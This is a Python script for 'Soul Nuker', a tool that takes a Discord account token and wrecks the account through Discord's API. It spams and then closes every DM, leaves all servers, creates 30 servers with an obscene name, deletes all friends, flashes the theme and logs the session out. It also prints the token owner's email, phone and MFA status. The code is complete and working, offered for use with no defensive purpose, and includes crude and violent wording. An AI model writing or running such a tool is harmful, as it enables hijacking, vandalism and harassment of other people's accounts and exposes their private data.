import requests, json, time, threading, colorama, os, ctypes
from datetime import datetime
from colorama import Fore, Back, Style

ctypes.windll.kernel32.SetConsoleTitleW("Soul Nuker | v1 ~ by array")

colorama.init(autoreset=True)
should_exit = False

# settings
flash_screen = True
create_guilds = True
delete_guilds = True
close_dms = True
remove_friends = True

def c_time():
    time_now = datetime.now()
    current_time = time_now.strftime("%H:%M:%S")
    return current_time

def get_headers(token):
    headers = {'Authorization': token}
    return headers

def funny_flash(token):
    headers = get_headers(token)
    while not should_exit:
        requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers,
                        json={"locale": "zh-CN", "theme": "dark"})
        time.sleep(1)
        requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers,
                        json={"locale": "zh-CN", "theme": "light"})
        time.sleep(1)

def close_dms_spam(token, message):
    headers = get_headers(token)

    r = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
    if r.status_code == 200:
        for channel in r.json():
            # send spam
            payload = {
                'content': message
            }
            requests.post(f'https://discord.com/api/v9/channels/{channel["id"]}/messages', headers=headers,
                          json=payload)

            # bye bye dm
            requests.delete(f'https://discord.com/api/v9/channels/{channel["id"]}', headers=headers)
            print(f'{Fore.LIGHTGREEN_EX}[{c_time()}]{Fore.WHITE} Closed DM with {channel["id"]}')
    print(f"{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Done closing/spamming dms")

def nuke_guilds(token):
    headers = get_headers(token)

    # get guilds
    guild_ids = []
    url = 'https://discord.com/api/v9/users/@me/guilds'
    while url:
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            for guild in r.json():
                guild_ids.append(guild['id'])
            url = r.links.get('next', {}).get('url')
        elif r.status_code == 429: # Rate limited
            retry_after = r.headers.get('retry-after')
            print(f'{Fore.LIGHTYELLOW_EX}[{c_time()}]{Fore.WHITE} Rate limited, retry after {retry_after} seconds')
            time.sleep(int(retry_after) + 1)
        else:
            print(f'{Fore.LIGHTRED_EX}[{c_time()}]{Fore.WHITE} Error getting guilds: {r.status_code} {r.text}')
            return

    # leave/rape all guilds
    for guild_id in guild_ids:
        url = f'https://discord.com/api/v9/users/@me/guilds/{guild_id}'
        while True:
            r = requests.delete(url, headers=headers)
            if r.status_code == 204:
                print(f'{Fore.LIGHTGREEN_EX}[{c_time()}]{Fore.WHITE} Left guild {guild_id}')
                break
            elif r.status_code == 429: # Rate limited
                retry_after = r.headers.get('retry-after')
                print(f'{Fore.LIGHTYELLOW_EX}[{c_time()}]{Fore.WHITE} Rate limited, retry after {retry_after} seconds')
                time.sleep(int(retry_after) + 1)
            else:
                print(f'{Fore.LIGHTRED_EX}[{c_time()}]{Fore.WHITE} Error leaving guild {guild_id}: {r.status_code} {r.text}')
                pass
    print(f'{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Done leaving guilds')

def nuke_account(token, message):
    global should_exit
    headers = get_headers(token)

    # get user info
    r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if r.status_code != 200:
        print(f'{Fore.LIGHTRED_EX}[{c_time()}]{Fore.WHITE} Error getting user info: {r.status_code} {r.text}')
        return

    user_id = r.json()['id']

    if create_guilds:
        # Create servers
        for i in range(30):
            payload = {
                'name': f'FUCKED BY SOUL NUKER-{i}',
                'region': 'us-west'
            }
            r = requests.post('https://discord.com/api/v9/guilds', headers=headers, json=payload)
            if r.status_code == 201:
                server_id = r.json()['id']
                print(f'{Fore.LIGHTGREEN_EX}[{c_time()}]{Fore.WHITE} Created server {server_id}')
                payload = {
                    'content': message
                }
                requests.post(f'https://discord.com/api/v9/channels/{server_id}/messages', headers=headers,
                                json=payload)
            elif r.status_code == 429:
                retry_after = r.headers.get('retry-after')
                print(f'{Fore.LIGHTYELLOW_EX}[{c_time()}]{Fore.WHITE} Rate limited, retry after {retry_after} seconds')
                time.sleep(int(retry_after) + 1)
            else:
                print(f'{Fore.LIGHTRED_EX}[{c_time()}]{Fore.WHITE} Error creating server: {r.status_code} {r.text}')

        print(f'{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Done creating guilds')


    if remove_friends:
        # Delete all friends
        r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
        if r.status_code == 200:
            for relationship in r.json():
                requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{relationship["id"]}', headers=headers)
                print(f'{Fore.LIGHTGREEN_EX}[{c_time()}]{Fore.WHITE} Removed friend: {relationship["id"]}')

        print(f'{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Done removing all friends')

    # Close session
    requests.post('https://discord.com/api/v9/auth/logout', headers=headers)
    print(f'{Fore.LIGHTBLUE_EX}[{c_time()}]{Fore.WHITE} Nuke complete')
    should_exit = True


def settings():
    os.system('cls')
    global flash_screen, create_guilds, delete_guilds, close_dms, remove_friends

    sel = ["1", "2", "3", "4", "5", "return", "0"]
    print(f"""
    
        [1] Flash screen: {flash_screen}
        [2] Create servers: {create_guilds}
        [3] Remove servers: {delete_guilds}
        [4] Close dms: {close_dms}
        [5] Remove friends: {remove_friends}
    
        To change type the number of the setting.
        To return type the "return" or "0".
        
    """)

    # busted ass menu
    x = input("     [?] ")
    if x not in sel:
        os.system('cls')
        settings()
    elif x == "1":
        if flash_screen:
            flash_screen = False
            settings()
        elif flash_screen == False:
            flash_screen = True
            settings()
    elif x == "2":
        if create_guilds:
            create_guilds = False
            settings()
        elif create_guilds == False:
            create_guilds = True
            settings()
    elif x == "3":
        if delete_guilds:
            delete_guilds = False
            settings()
        elif delete_guilds == False:
            delete_guilds = True
            settings()
    elif x == "4":
        if close_dms:
            close_dms = False
            settings()
        elif close_dms == False:
            close_dms = True
            settings()
    elif x == "5":
        if remove_friends:
            remove_friends = False
            settings()
        elif remove_friends == False:
            remove_friends = True
            settings()
    elif x == "return" or x == "0":
        os.system('cls')
        menu()

def menu():
    tabs = ["1", "2", "3"]
    print(f"""
{Fore.LIGHTBLACK_EX}
                         __               __            
       _________  __  __/ /  ____  __  __/ /_____  _____
      / ___/ __ \/ / / / /  / __ \/ / / / //_/ _ \/ ___/
     (__  ) /_/ / /_/ / /  / / / / /_/ / ,< /  __/ /    
    /____/\____/\__,_/_/  /_/ /_/\__,_/_/|_|\___/_/     
                                                    
        
        
    {Fore.LIGHTBLACK_EX}[1]{Fore.WHITE} Nuker
    {Fore.LIGHTBLACK_EX}[2]{Fore.WHITE} Nuker settings
    {Fore.LIGHTBLACK_EX}[3]{Fore.WHITE} Get token info
        
    """)

    # busted ass menu
    x = input(f"    {Fore.LIGHTBLACK_EX}[?]{Fore.WHITE} ")
    if x not in tabs:
        os.system('cls')
        menu()
    if x == "1":
        os.system('cls')
        nuke_button()
    if x == "2":
        os.system('cls')
        settings()
    if x == "3":
        os.system('cls')
        info_token()

def info_token():
    token = input("[?] Token: ")

    response = requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(token))
    if response.status_code != 200:
        print("[-] Token invalid, please try again")
        time.sleep(2)
        info_token()

    user_info = response.json()

    print("[+] User Info:")
    print(f" - ID: {user_info['id']}")
    print(f" - Username: {user_info['username']}#{user_info['discriminator']}")
    print(f" - Email: {user_info['email']}")
    print(f" - Phone: {user_info['phone']}")
    print(f" - Avatar URL: {user_info['avatar']}")
    print(f" - Flags: {user_info['flags']}")
    print(f" - Locale: {user_info['locale']}")
    print(f" - Verified: {user_info['verified']}")
    print(f" - MFA Enabled: {user_info['mfa_enabled']}")
    input("\n[!] Press anything to return")
    os.system('cls')
    menu()

def nuke_button():
    token = input("[?] Token: ")

    response = requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(token))
    if response.status_code == 200:
        if close_dms:
            message = input("[?] Spam message (leave blank for no spam before closing): ")
        else:
            message = ''

        if flash_screen:
            flash = threading.Thread(target=funny_flash, args=(token,))
            flash.start()
        elif close_dms:
            close_dm = threading.Thread(target=close_dms_spam, args=(token, message,))
            close_dm.start()
        elif delete_guilds:
            remove_guilds = threading.Thread(target=nuke_guilds, args=(token,))
            remove_guilds.start()

        nuke_account(token, message)
    else:
        print("[-] Token invalid, please try again")
        time.sleep(2)
        nuke_button()

menu()
